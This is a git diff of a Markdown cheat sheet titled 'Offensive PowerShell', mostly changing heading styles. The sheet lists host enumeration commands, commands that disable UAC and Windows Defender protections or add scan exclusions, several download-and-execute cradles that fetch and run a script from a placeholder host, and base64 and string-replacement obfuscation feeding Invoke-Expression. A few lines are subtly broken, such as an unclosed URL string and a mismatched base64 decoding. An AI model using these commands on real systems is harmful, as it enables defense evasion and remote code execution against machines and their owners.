@@ -1,132 +1,130 @@
 # Offensive PowerShell
   
-#### General PowerShell  
+### General PowerShell  
   
-~ Cmdlet Help  
+##### Cmdlet Help  
 `Get-Help <CMDLET>`  
   
-~ Code Injection - Invoke-Expression  
+##### Code Injection - Invoke-Expression  
 `$<STRING> = 'Write-Output "Test text!"'`  
 `Invoke-Expression $<STRING>`  
   
-#### Domain Enumeration
+### Domain Enumeration
   
-#### Local Enumeration
+### Local Enumeration
   
-~ List all running processes  
+##### List all running processes  
 `Get-Process`  
   
-~ Get Current Computer Information  
+##### Get Current Computer Information  
 `Get-ComputerInfo -Property CsName,WindowsVersion,WindowsBuildLabEx,WindowsEditionId,OsArchitecture,CsProcessors,CsTotalPhysicalMemory`  
   
-~ Get Network Interfaces Information  
+##### Get Network Interfaces Information  
 `Get-NetAdapter`  
 `Get-NetIPAddress`  
 `Get-NetIPConfiguration`  
   
-~ Get Local Users Information  
+##### Get Local Users Information  
 `Get-LocalUser | Select-Object Name,SID,Enabled,LastLogon,Created,Modified`  
   
-~ Get Local Groups Information  
+##### Get Local Groups Information  
 `Get-LocalGroup`  
 `Get-LocalGroupMember -Group <GROUP NAME>`  
   
-
-
-#### Execution Policy  
+### Execution Policy  
   
-~ Execution Policy Information  
+##### Execution Policy Information  
 `Get-ExecutionPolicy -List`  
   
-~ Allow unsigned scripts execution for the current user  
+##### Allow unsigned scripts execution for the current user  
 `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`  
 `powershell -ep bypass`  
   
-#### UAC
+### UAC
   
-~ Get UAC Configuration  
+##### Get UAC Configuration  
 `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object -Property EnableLUA,ConsentPromptBehaviorAdmin`  
 (EnableLUA = UAC [0 = False, 1 = True], ConsentPromptBehaviorAdmin = Prompt Behavior [0-5])  
   
-~ Disable UAC (requires admin)  
+##### Disable UAC (requires admin)  
 `cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"`  
   
-#### AV / Firewall  
+### AV / Firewall  
   
-~ Get Firewall Information  
+##### Get Firewall Information  
 ` Get-NetFirewallProfile`  
   
-~ Get Windows Defender Status  
+##### Get Windows Defender Status  
 `Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected`  
 `Get-MpPreference` (some items require admin access to display information)  
   
-~ List other AV Products  
+##### List other AV Products  
 `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`  
 `'0x{0:x}' -f <ProductState>`  (10 from the 4th number position = on)  
 
-~ Disables realtime monitoring (requires admin)  
+##### Disables realtime monitoring (requires admin)  
 `Set-MpPreference -DisableRealtimeMonitoring $true`  
   
-~ Disables scanning for downloaded files or attachments (requires admin)  
+##### Disables scanning for downloaded files or attachments (requires admin)  
 `Set-MpPreference -DisableIOAVProtection $true`  
   
-~ Disable behaviour monitoring (requires admin)  
+##### Disable behaviour monitoring (requires admin)  
 `Set-MPPreference -DisableBehaviourMonitoring $true`  
   
-~ Make exclusion for a certain folder (requires admin)  
+##### Make exclusion for a certain folder (requires admin)  
 `Add-MpPreference -ExclusionPath "C:\Windows\Temp"`  
   
-~ Disables cloud detection (requires admin)  
+##### Disables cloud detection (requires admin)  
 `Set-MPPreference -DisableBlockAtFirstSeen $true`  
   
-~ Disables scanning of .pst and other email formats (requires admin)  
+##### Disables scanning of .pst and other email formats (requires admin)  
 `Set-MPPreference -DisableEmailScanning $true`  
   
-~ Disables script scanning during malware scans (requires admin)  
+##### Disables script scanning during malware scans (requires admin)  
 `Set-MPPReference -DisableScriptScanning $true`  
   
-~ Exclude files by extension (requires admin)  
+##### Exclude files by extension (requires admin)  
 `Set-MpPreference -ExclusionExtension "ps1"`  
   
-#### Remote Code Execution  
+### Remote Code Execution  
   
-~ Invoke-Command  
+##### Invoke-Command  
 `$computer = "<COMPUTER>"`  
 `$creds = Get-Credential`  
 `$script = { Write-Output "Test text!" }`  
 `Invoke-Command -ComputerName $computer -Credential $creds -ScriptBlock $script`  
   
-~ Invoke-RestMethod (Download and run remote scripts)  
+##### Invoke-RestMethod (Download and run remote scripts)  
 `$url = "https://site.com/script.ps1"`  
 `$script = Invoke-RestMethod -Uri $url`  
 `Invoke-Expression $script`  
   
-~ Start-Process (open a new PS instance and run a downloaded script - useful to bypass execution policies)  
+##### Start-Process (open a new PS instance and run a downloaded script - useful to bypass execution policies)  
 `$url = "https://site.com/script.ps1"`  
 `Invoke-WebRequest -Uri $url -OutFile "script.ps1"`  
 `Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File script.ps1"`  
   
-~ IEX = Invoke-Expression (run script from memory)  
+##### IEX = Invoke-Expression (run script from memory)  
 `$url = "https://site.com/script.ps1"`  
 `IEX (New-Object System.Net.WebClient).DownloadString($url)`  
   
-~ Invoke-WebRequest (run script from memory)  
+##### Invoke-WebRequest (run script from memory)  
 `$url = "https://site.com/script.ps1`  
 `$script = Invoke-WebRequest -Uri $url -UseBasicParsing`  
 `Invoke-Expression $script.Content`  
   
-~ Invoke-RestMethod (run script from memory)  
+##### Invoke-RestMethod (run script from memory)  
 `$url = "https://site.com/script.ps1"`  
 `$script = Invoke-RestMethod -Uri $url`  
 `Invoke-Expression $script`  
   
-~ BitsTransfer (run script from memory)  
+##### BitsTransfer (run script from memory)  
 `$url = "https://site.com/script.ps1"`  
 `Import-Module BitsTransfer`  
 `Start-BitsTransfer -Source $url -Destination "script.ps1"`  
 `Invoke-Expression -Command (Get-Content -Path "script.ps1" -Raw)`  
   
-~ Code Compression / Decompression (run script from memory)  
+##### Code Compression / Decompression (run script from memory)  
 `$url = "https://site.com/script.ps1.gz"`  
 `$compressed = (New-Object System.Net.WebClient).DownloadData($url)`  
 `$stream = New-Object IO.MemoryStream`  
@@ -137,20 +135,20 @@
 `$script = $reader.ReadToEnd()`  
 `Invoke-Expression $script`  
 
-#### Code Obfuscation
+### Code Obfuscation
   
-~ Base64 Encoding  
-`$text = "Test encoded text"`  
-`$bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`  
-`$encoded =[Convert]::ToBase64String($bytes)`  
-`Invoke-Expression $encoded`  
-  
-~ Base64 Decoding  
-`$encoded = "VABlAHMAdAAgAGUAbgBjAG8AZABlAGQAIAB0AGUAeAB0AA=="`  
+##### Base64 Decoding  
+`$encoded = "V3JpdGUtT3V0cHV0ICJUZXN0IHRleHQi"`  
 `$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))`  
-`Invoke-Expression $decoded`  
+`$decoded`  
   
-~ Characters Replacement  
+##### Characters Replacement  
 `$obfuscated = "abcdef-ghijkl 'Test text'"`  
-`$command = $obfuscatedCommand -replace 'abcdef', 'Write' -replace 'ghijkl', 'Output'`  
+`$command = $obfuscated -replace 'abcdef', 'Write' -replace 'ghijkl', 'Output'`  
+`$command`  
 `Invoke-Expression $command`  
+  
+##### Inline Scripts  
+`iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGUtT3V0cHV0ICJUZXN0IHRleHQi")))`  
+  
+##### Function Renaming  
